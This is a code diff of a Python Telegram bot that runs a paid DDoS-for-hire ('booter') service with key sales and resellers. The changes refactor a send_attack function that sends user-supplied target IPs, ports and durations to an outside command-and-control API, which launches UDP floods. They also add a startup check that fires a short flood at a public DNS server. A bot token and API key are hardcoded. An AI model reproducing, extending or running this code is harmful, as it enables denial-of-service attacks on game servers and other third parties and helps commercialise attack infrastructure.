@@ -16,7 +16,7 @@ BOT_TOKEN = "8291785662:AAHlFw4PQS_H7HKCC9ArvFS9lZ8KzbdZTGM"
 ADMIN_ID = ["8487946379"]
 API_URL = "http://cnc.teamc2.xyz:5001/api/attack"
 API_KEY = "WTRMWL"
-GLOBAL_CONCURRENT = 2  # Main bot ki global limit
+GLOBAL_CONCURRENT = 2
 COOLDOWN_TIME = 30
 
 # ========== FILE PATHS ==========
@@ -33,7 +33,7 @@ if not os.path.exists(DATA_DIR):
     os.makedirs(DATA_DIR)
 
 # ========== DATA STRUCTURES ==========
-active_attacks = {}  # MAIN BOT attacks
+active_attacks = {}
 cooldown = {}
 hosted_bots = {}
 hosted_bot_instances = {}
@@ -128,6 +128,29 @@ COOLDOWN_TIME = settings.get("cooldown", 30)
 
 bot = telebot.TeleBot(BOT_TOKEN)
 
+# ========== API TEST FUNCTION ==========
+def test_api_connection():
+    """Test API connection on startup"""
+    try:
+        test_params = {
+            "api_key": API_KEY,
+            "target": "8.8.8.8",
+            "port": 80,
+            "time": 5,
+            "concurrent": 1,
+            "method": "udp"
+        }
+        response = requests.get(API_URL, params=test_params, timeout=10)
+        if response.status_code == 200:
+            print("✅ API Connection: WORKING")
+            return True
+        else:
+            print(f"⚠️ API Response: {response.status_code}")
+            return False
+    except Exception as e:
+        print(f"❌ API Connection Failed: {e}")
+        return False
+
 # ========== HELPER FUNCTIONS ==========
 def check_maintenance():
     return maintenance_mode
@@ -157,7 +180,6 @@ def format_duration(value, unit):
     return f"{value} Day(s)"
 
 def get_main_active_count():
-    """Main bot ke active attacks"""
     now = time.time()
     for attack_id, info in list(active_attacks.items()):
         if now >= info["finish_time"]:
@@ -277,6 +299,63 @@ def cleanup_expired_keys():
 
 cleanup_thread = threading.Thread(target=cleanup_expired_keys, daemon=True)
 cleanup_thread.start()
+
+# ========== SEND ATTACK FUNCTION ==========
+def send_attack(ip, port, duration, chat_id, bot_instance, is_hosted=False, bot_token=None):
+    """Common function to send attack to API"""
+    max_retries = 3
+    for attempt in range(max_retries):
+        try:
+            api_params = {
+                "api_key": API_KEY,
+                "target": ip,
+                "port": port,
+                "time": duration,
+                "concurrent": 1,
+                "method": "udp"
+            }
+            
+            headers = {
+                "User-Agent": "Mozilla/5.0",
+                "Content-Type": "application/json",
+                "Accept": "application/json"
+            }
+            
+            response = requests.get(API_URL, params=api_params, timeout=30, headers=headers)
+            
+            if response.status_code == 200:
+                time.sleep(duration)
+                bot_instance.send_message(chat_id, f"✅ ATTACK FINISHED!\n\n🎯 Target: {ip}:{port}\n⏱️ Duration: {duration}s\n🔄 Restart your game!")
+                return True
+            else:
+                if attempt < max_retries - 1:
+                    time.sleep(2)
+                    continue
+                bot_instance.send_message(chat_id, f"❌ Attack failed! API Status: {response.status_code}")
+                return False
+                
+        except requests.exceptions.Timeout:
+            if attempt < max_retries - 1:
+                time.sleep(2)
+                continue
+            bot_instance.send_message(chat_id, "❌ Attack failed! API timeout.")
+            return False
+            
+        except requests.exceptions.ConnectionError:
+            if attempt < max_retries - 1:
+                time.sleep(2)
+                continue
+            bot_instance.send_message(chat_id, "❌ Attack failed! Cannot connect to API.")
+            return False
+            
+        except Exception as e:
+            if attempt < max_retries - 1:
+                time.sleep(2)
+                continue
+            bot_instance.send_message(chat_id, f"❌ Attack failed! {str(e)[:50]}")
+            return False
+    
+    return False
 
 # ========== HOST BOT FUNCTION ==========
 def start_hosted_bot(bot_token, owner_id, owner_name, concurrent):
@@ -398,7 +477,7 @@ def start_hosted_bot(bot_token, owner_id, owner_name, concurrent):
                         active_in_this_bot += 1
                 
                 if active_in_this_bot >= concurrent:
-                    hosted_bot.reply_to(msg, f"❌ CONCURRENT LIMIT REACHED!\n📊 Active attacks in this bot: {active_in_this_bot}/{concurrent}\n💡 Use /status to check when a slot frees up")
+                    hosted_bot.reply_to(msg, f"❌ CONCURRENT LIMIT REACHED!\n📊 Active attacks: {active_in_this_bot}/{concurrent}\n💡 Use /status to check when a slot frees up")
                     return
             
             now = time.time()
@@ -413,7 +492,7 @@ def start_hosted_bot(bot_token, owner_id, owner_name, concurrent):
             target_key = f"{ip}:{port}"
             finish_time = now + duration
             
-            # Check target under attack in this hosted bot only
+            # Check target under attack
             target_under_attack = False
             if bot_token in hosted_bots:
                 for aid, ainfo in hosted_bots[bot_token].get("active_attacks", {}).items():
@@ -446,32 +525,12 @@ def start_hosted_bot(bot_token, owner_id, owner_name, concurrent):
                 if now < ainfo["finish_time"]:
                     new_active += 1
             
-            hosted_bot.reply_to(msg, f"✨ ATTACK LAUNCHED! ✨\n\n🎯 Target: {ip}:{port}\n⏱️ Duration: {duration}s\n⚡ Method: UDP (Auto)\n📊 Active Slots: {new_active}/{concurrent}")
+            hosted_bot.reply_to(msg, f"✨ ATTACK LAUNCHED! ✨\n\n🎯 Target: {ip}:{port}\n⏱️ Duration: {duration}s\n⚡ Method: UDP (Auto)\n📊 Active Slots: {new_active}/{concurrent}\n🔄 Sending to API...")
             
             def run():
-                retry = 0
-                while retry < 3:
-                    try:
-                        api_params = {"api_key": API_KEY, "target": ip, "port": port, "time": duration, "concurrent": 1, "method": "udp"}
-                        response = requests.get(API_URL, params=api_params, timeout=15)
-                        
-                        if response.status_code == 200:
-                            time.sleep(duration)
-                            hosted_bot.send_message(msg.chat.id, f"✅ ATTACK FINISHED!\n🎯 Target: {ip}:{port}\n⏱️ Duration: {duration}s\n🔄 Restart your game!")
-                            break
-                        else:
-                            retry += 1
-                            if retry < 3:
-                                time.sleep(2)
-                            else:
-                                hosted_bot.send_message(msg.chat.id, f"❌ Attack failed! API error.")
-                    except Exception as e:
-                        retry += 1
-                        if retry < 3:
-                            time.sleep(2)
-                        else:
-                            hosted_bot.send_message(msg.chat.id, f"❌ Attack failed! {str(e)[:50]}")
+                success = send_attack(ip, port, duration, msg.chat.id, hosted_bot, is_hosted=True, bot_token=bot_token)
                 
+                # Cleanup
                 if bot_token in hosted_bots and attack_id in hosted_bots[bot_token]["active_attacks"]:
                     del hosted_bots[bot_token]["active_attacks"][attack_id]
                     save_hosted_bots(hosted_bots)
@@ -501,7 +560,6 @@ def start_hosted_bot(bot_token, owner_id, owner_name, concurrent):
                         status_msg += f"✅ SLOT {i+1}: FREE\n└ 💡 Ready for attack\n\n"
                 
                 status_msg += f"📊 TOTAL ACTIVE: {len(active_list)}/{bot_info['concurrent']}"
-                
                 hosted_bot.reply_to(msg, status_msg)
             else:
                 hosted_bot.reply_to(msg, "✅ ALL SLOTS FREE ✅\n\nNo ongoing attacks detected!")
@@ -524,7 +582,7 @@ def start_hosted_bot(bot_token, owner_id, owner_name, concurrent):
                 hosted_bot.reply_to(msg, f"✅ RESELLER ADDED!\n👤 User: {new_reseller}\n🔑 Can now generate keys")
             else:
                 hosted_bot.reply_to(msg, "❌ User is already a reseller!")
-                
+        
         @hosted_bot.message_handler(commands=['removereseller'])
         def hosted_remove_reseller(msg):
             uid = str(msg.chat.id)
@@ -849,7 +907,6 @@ def attack(msg):
         bot.reply_to(msg, f"❌ Your access has expired!\n\n🛒 Buy new key: XSILENT")
         return
     
-    # Check global concurrent
     main_active = get_main_active_count()
     if main_active >= GLOBAL_CONCURRENT:
         bot.reply_to(msg, f"❌ GLOBAL LIMIT REACHED!\n🌐 Total active attacks: {main_active}/{GLOBAL_CONCURRENT}\n💡 Wait for an attack to finish.\n\n⚡ Use /status to check current attacks")
@@ -911,24 +968,10 @@ def attack(msg):
     }
     
     new_total = get_main_active_count()
-    bot.reply_to(msg, f"✨ ATTACK LAUNCHED! ✨\n\n🎯 Target: {ip}:{port}\n⏱️ Duration: {duration}s\n⚡ Method: UDP (Auto)\n🌐 Global Active: {new_total}/{GLOBAL_CONCURRENT}")
+    bot.reply_to(msg, f"✨ ATTACK LAUNCHED! ✨\n\n🎯 Target: {ip}:{port}\n⏱️ Duration: {duration}s\n⚡ Method: UDP (Auto)\n🌐 Global Active: {new_total}/{GLOBAL_CONCURRENT}\n🔄 Sending to API...")
     
     def run():
-        retry = 0
-        while retry < 3:
-            try:
-                api_params = {"api_key": API_KEY, "target": ip, "port": port, "time": duration, "concurrent": 1, "method": "udp"}
-                response = requests.get(API_URL, params=api_params, timeout=15)
-                if response.status_code == 200:
-                    time.sleep(duration)
-                    bot.send_message(msg.chat.id, f"✅ ATTACK FINISHED!\n\n🎯 Target: {ip}:{port}\n⏱️ Duration: {duration}s\n🔄 Restart your game!")
-                    break
-                else:
-                    retry += 1
-                    time.sleep(2)
-            except:
-                retry += 1
-                time.sleep(2)
+        send_attack(ip, port, duration, msg.chat.id, bot, is_hosted=False)
         if attack_id in active_attacks:
             del active_attacks[attack_id]
     
@@ -1112,7 +1155,7 @@ def remove_key(msg):
     if len(args) != 2:
         bot.reply_to(msg, "⚠️ Usage: /removekey KEY")
         return
-        
+    
     key = args[1]
     if key not in keys_data:
         bot.reply_to(msg, "❌ Key not found!")
@@ -1552,7 +1595,7 @@ def api_status(msg):
         return
     
     try:
-        test_response = requests.get(f"{API_URL}?api_key={API_KEY}&target=8.8.8.8&port=80&time=5&concurrent=1", timeout=5)
+        test_response = requests.get(f"{API_URL}?api_key={API_KEY}&target=8.8.8.8&port=80&time=5&concurrent=1", timeout=10)
         status = "Online" if test_response.status_code == 200 else "Offline"
         bot.reply_to(msg, f"✅ API STATUS\n\n📡 Status: {status}\n🎯 Active Attacks: {get_main_active_count()}")
     except:
@@ -1592,4 +1635,4 @@ print(f"📊 Hosted Bots: {len(hosted_bots)}")
 print("=" * 50)
 
 bot.infinity_polling()
-        
+    
